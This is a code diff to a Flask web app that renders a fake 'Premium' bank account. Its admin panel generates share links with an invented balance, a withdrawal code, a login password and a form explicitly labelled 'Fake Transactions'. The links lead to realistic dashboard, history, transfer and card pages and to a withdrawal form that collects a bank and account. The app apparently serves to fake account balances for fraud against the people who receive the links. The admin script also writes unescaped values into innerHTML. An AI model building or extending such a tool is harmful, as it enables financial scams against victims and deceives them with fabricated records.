+  <a href="{{ url_for('user_logout', slug=slug) }}" style="text-decoration:none"><button class="primary" style="background:#2a0f14;color:#fca5a5">Log Out</button></a>
+</div>
+{{ tab|safe }}
+</body></html>
+"""
+
+# ---------------- User Auth & Routing ----------------
+
+LOGIN_HTML = """
+<!doctype html><html><head><meta charset="utf-8"><title>Login — {{ bank }}</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<style>{{ css|safe }}</style></head><body>
+<div class="wrap" style="margin-top:20vh">
+  <div class="card" style="text-align:center">
+    <div class="hero-content" style="margin-bottom:2rem">
+      <div class="bank-logo-sm" style="justify-content:center">
+        <div class="icon"><svg viewBox="0 0 24 24" fill="#fff" width="14" height="14"><path d="M12 2L2 22h20L12 2z"/></svg></div>
+        <div class="txt">{{ bank }}<br>Premium</div>
+      </div>
+      <h2 style="font-size:1.3rem;margin:1rem 0 0">Welcome back, {{ name }}</h2>
+      <p style="color:#9aa7c7;font-size:.9rem;margin-top:.5rem">Enter your password to access your account.</p>
+    </div>
+    
+    <label style="text-align:left">Password</label>
+    <input id="pw" type="password" placeholder="Enter your password">
+    
+    <button class="primary" onclick="doLogin()">Log In</button>
+    <div class="msg" id="msg"></div>
+  </div>
+</div>
+<script>
+async function doLogin(){
+  const btn=document.querySelector('button.primary');
+  const msg=document.getElementById('msg');
+  const pw=document.getElementById('pw').value;
+  if(!pw){ msg.className='msg err show'; msg.textContent='password required'; return; }
+  btn.disabled=true; msg.className='msg show'; msg.textContent='verifying…';
+  try{
+    const r=await fetch(location.pathname+'/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})});
+    const d=await r.json();
+    if(r.ok&&d.ok){
+      msg.className='msg ok show'; msg.textContent='Success — redirecting…';
+      setTimeout(()=>location.href='/v/{{slug}}/dashboard',600);
+    } else {
+      msg.className='msg err show'; msg.textContent=d.error||'wrong password';
+      btn.disabled=false;
+    }
+  }catch(e){
+    msg.className='msg err show'; msg.textContent='network error';
+    btn.disabled=false;
+  }
+}
+</script>
+</body></html>
+"""
+
+@app.route("/v/<slug>/login")
+def user_login(slug):
     rec = db_get_link(slug)
     if not rec: abort(404)
-    tab = render_template_string(BOTTOM_TAB, slug=slug, active="withdraw")
-    return render_template_string(
-        WITHDRAW_HTML, css=BANK_CSS, tab=tab,
+    if not rec.get("password_hash"): return redirect(url_for("user_page", slug=slug, page="dashboard"))
+    return render_template_string(LOGIN_HTML, css=BANK_CSS, bank=BANK_NAME, name=rec["name"], slug=slug)
+
+@app.route("/v/<slug>/auth", methods=["POST"])
+def user_auth(slug):
+    d = request.get_json(force=True)
+    rec = db_get_link(slug)
+    if not rec: return jsonify({"error":"not found"}), 404
+    if check_pw(d.get("password",""), rec.get("password_hash")):
+        session[f"auth_{slug}"] = True
+        return jsonify({"ok": True})
+    return jsonify({"error": "incorrect password"}), 401
+
+@app.route("/v/<slug>/logout")
+def user_logout(slug):
+    session.pop(f"auth_{slug}", None)
+    return redirect(url_for("user_login", slug=slug))
+
+@app.route("/v/<slug>")
+def view_account_redirect(slug):
+    return redirect(url_for('user_page', slug=slug, page='dashboard'))
+
+@app.route("/v/<slug>/<page>")
+@user_required
+def user_page(slug, page):
+    rec = db_get_link(slug)
+    if page not in ['dashboard', 'history', 'transfer', 'cards', 'settings']:
+        return redirect(url_for('user_page', slug=slug, page='dashboard'))
+        
+    withdrawn_amount = rec.get("withdrawn_amount") or 0
+    opening = rec["balance"] + withdrawn_amount
+    acct_full = "0123" + str(abs(hash(slug)) % 10000000).zfill(7)
+    acct_last = acct_full[-4:]
+    
+    # Parse transactions
+    tx_list = []
+    if rec.get("transactions"):
+        try: tx_list = json.loads(rec["transactions"])
+        except: pass
+        
+    # Prepend actual withdrawal if exists
+    if rec.get("withdrawn"):
+        tx_list.insert(0, {
+            "name": f"Transfer to {rec.get('bank')}",
+            "date": "Just now",
+            "amount": -(rec.get("withdrawn_amount") or 0)
+        })
+
+    tab = render_template_string(BOTTOM_TAB, slug=slug, active=page)
+    
+    kwargs = dict(
+        css=BANK_CSS, tab=tab, slug=slug,
         bank=BANK_NAME, name=rec["name"], currency=rec["currency"],
-        withdrawn=rec.get("withdrawn", False), slug=slug,
+        balance=rec["balance"], withdrawn=rec.get("withdrawn", False),
+        withdrawn_amount=withdrawn_amount, opening=opening,
+        acct_full=acct_full, acct_last=acct_last,
+        bank_dest=rec.get("bank") or "Bank",
+        tx_list=tx_list
     )
+    
+    if page == 'dashboard':
+        return render_template_string(DASHBOARD_HTML, **kwargs)
+    elif page == 'history':
+        return render_template_string(HISTORY_HTML, **kwargs)
+    elif page == 'transfer':
+        return render_template_string(TRANSFER_HTML, **kwargs)
+    elif page == 'cards':
+        return render_template_string(CARDS_HTML, **kwargs)
+    elif page == 'settings':
+        return render_template_string(SETTINGS_HTML, **kwargs)
 
 @app.route("/v/<slug>/withdraw/submit", methods=["POST"])
+@user_required
 def withdraw_submit(slug):
     d = request.get_json(force=True)
     rec = db_get_link(slug)
@@ -457,7 +692,7 @@ def withdraw_submit(slug):
     return jsonify({"ok": True})
 
 # ---------------- Landing (Oops Page) ----------------
-# [Unchanged from previous, using BANK_CSS variables for colors]
+
 NOT_A_USER_HTML = """
 <!doctype html><html><head><meta charset="utf-8"><title>{{ bank }} — Not a user</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -502,7 +737,7 @@ def favicon():
 def not_found(e):
     return render_landing(), 404
 
-# ---------------- Admin (Unchanged) ----------------
+# ---------------- Admin ----------------
 
 ADMIN_HTML = """
 <!doctype html><html><head><meta charset="utf-8"><title>Admin</title>
@@ -514,7 +749,7 @@ body{background:#0b0f1a;color:#e8eefc;font-family:system-ui,sans-serif;margin:0;
 @media(max-width:900px){.grid{grid-template-columns:1fr}body{padding:1rem}}
 .card{background:#111827;padding:1.5rem;border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.5)}
 label{display:block;font-size:.85rem;color:#9aa7c7;margin-top:.8rem}
-input,select{width:100%;padding:.6rem;margin-top:.3rem;background:#0b1220;border:1px solid #1f2a44;color:#e8eefc;border-radius:8px;box-sizing:border-box}
+input,select,textarea{width:100%;padding:.6rem;margin-top:.3rem;background:#0b1220;border:1px solid #1f2a44;color:#e8eefc;border-radius:8px;box-sizing:border-box;font-family:inherit}
 button{padding:.7rem 1.2rem;background:#2563eb;color:#fff;border:0;border-radius:8px;cursor:pointer;font-weight:600;margin-top:1rem}
 table{width:100%;border-collapse:collapse;margin-top:1rem}
 th,td{padding:.6rem;border-bottom:1px solid #1f2a44;text-align:left;font-size:.9rem;vertical-align:top}
@@ -522,6 +757,9 @@ th{color:#9aa7c7;font-weight:500}
 a{color:#60a5fa;word-break:break-all}
 .code{font-family:monospace;background:#0b1220;padding:.15rem .4rem;border-radius:6px}
 .err{color:#f87171}.ok{color:#4ade80}
+.tx-row{display:grid;grid-template-columns:2fr 1fr 2fr 30px;gap:.5rem;margin-bottom:.5rem}
+.tx-row input{margin:0}
+.tx-row button{margin:0;padding:0;background:#7f1d1d;border-radius:8px;height:36px}
 </style></head><body>
 <div class="container">
 {% if not authed %}
@@ -541,15 +779,23 @@ a{color:#60a5fa;word-break:break-all}
       <h3 style="margin-top:0">Generate share link</h3>
       <form id="gen">
         <label>Display name</label><input name="name" required>
+        <label>User Password (for login)</label><input name="user_password" type="password" required placeholder="They'll use this to log in">
         <label>Currency</label>
         <select name="currency"><option>USD</option><option>EUR</option><option>GBP</option><option>NGN</option><option>JPY</option><option>CAD</option></select>
         <label>Balance</label><input name="balance" type="number" step="0.01" required value="0">
         <label>Withdrawal code</label><input name="withdraw_code" required>
-        <button>Generate</button>
+        
+        <label style="margin-top:1.5rem">Fake Transactions (optional)</label>
+        <div id="tx-container">
+          <!-- dynamic rows -->
+        </div>
+        <button type="button" onclick="addTxRow()" style="background:#1f2a44;font-size:.8rem;padding:.4rem .8rem">+ Add Transaction</button>
+
+        <button style="margin-top:1.5rem;width:100%">Generate Link</button>
       </form>
       <div id="out" style="margin-top:1rem"></div>
       <hr style="border-color:#1f2a44;margin:1.5rem 0">
-      <h4 style="margin-top:0">Change password</h4>
+      <h4 style="margin-top:0">Change admin password</h4>
       <form id="chpw">
         <label>Current</label><input name="current" type="password" required>
         <label>New</label><input name="new" type="password" required>
@@ -563,6 +809,16 @@ a{color:#60a5fa;word-break:break-all}
     </div>
   </div>
   <script>
+  function addTxRow(name='', amt='', date='') {
+    const div = document.createElement('div');
+    div.className = 'tx-row';
+    div.innerHTML = `<input placeholder="Name (e.g. Salary)" value="${name}">
+      <input type="number" step="0.01" placeholder="Amount (e.g. 500)" value="${amt}">
+      <input placeholder="Date (e.g. Today · 09:15)" value="${date}">
+      <button type="button" onclick="this.parentElement.remove()">×</button>`;
+    document.getElementById('tx-container').appendChild(div);
+  }
+  
   async function load(){
     const r=await fetch('/admin/api/links');
     const data=await r.json();
@@ -572,7 +828,7 @@ a{color:#60a5fa;word-break:break-all}
     for(const l of data){
       h+=`<tr><td>${l.name}</td><td>${l.currency}</td><td>${l.balance}</td>
       <td><span class="code">${l.withdraw_code}</span></td>
-      <td><a href="/v/${l.slug}" target="_blank">/v/${l.slug}</a></td>
+      <td><a href="/v/${l.slug}/dashboard" target="_blank">/v/${l.slug}</a></td>
       <td>${l.withdrawn?'withdrawn':'active'}</td>
       <td><button data-slug="${l.slug}" class="del" style="background:#7f1d1d">del</button></td></tr>`;
     }
@@ -585,13 +841,29 @@ a{color:#60a5fa;word-break:break-all}
   }
   document.getElementById('gen').onsubmit=async(e)=>{
     e.preventDefault();
-    const body=Object.fromEntries(new FormData(e.target).entries());
-    body.balance=parseFloat(body.balance);
+    const formData = new FormData(e.target);
+    
+    // parse transactions
+    const txs = [];
+    document.querySelectorAll('.tx-row').forEach(row => {
+      const inputs = row.querySelectorAll('input');
+      const name = inputs[0].value.trim();
+      const amt = parseFloat(inputs[1].value);
+      const date = inputs[2].value.trim();
+      if(name && !isNaN(amt) && date){
+        txs.push({name: name, amount: amt, date: date});
+      }
+    });
+
+    const body = Object.fromEntries(formData.entries());
+    body.balance = parseFloat(body.balance);
+    body.transactions = JSON.stringify(txs);
+    
     const r=await fetch('/admin/api/links',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
     const d=await r.json();
-    const url=location.origin+'/v/'+d.slug;
+    const url=location.origin+'/v/'+d.slug+'/dashboard';
     document.getElementById('out').innerHTML=`link: <a href="${url}" target="_blank">${url}</a>`;
-    e.target.reset(); load();
+    e.target.reset(); document.getElementById('tx-container').innerHTML=''; load();
   };
   document.getElementById('chpw').onsubmit=async(e)=>{
     e.preventDefault();
@@ -659,11 +931,17 @@ def create_link():
     cur=(d.get("currency") or "USD").strip()
     bal=float(d.get("balance") or 0)
     code=(d.get("withdraw_code") or "").strip()
-    if not name or not code: return jsonify({"error":"name and code required"}),400
+    user_pw=(d.get("user_password") or "").strip()
+    txs=(d.get("transactions") or "[]")
+    
+    if not name or not code or not user_pw: return jsonify({"error":"name, code, and user_password required"}),400
     slug=uuid.uuid4().hex
-    rec={"slug":slug,"name":name,"currency":cur,"balance":bal,"withdraw_code":code,
-         "withdrawn":False,"bank":None,"account":None,"withdrawn_amount":None,
-         "created":int(time.time())}
+    rec={
+        "slug":slug,"name":name,"currency":cur,"balance":bal,
+        "withdraw_code":code,"password_hash":hash_pw(user_pw),
+        "transactions":txs,"withdrawn":False,"bank":None,
+        "account":None,"withdrawn_amount":None,"created":int(time.time())
+    }
     db_put_link(rec)
     return jsonify({"slug":slug})
 
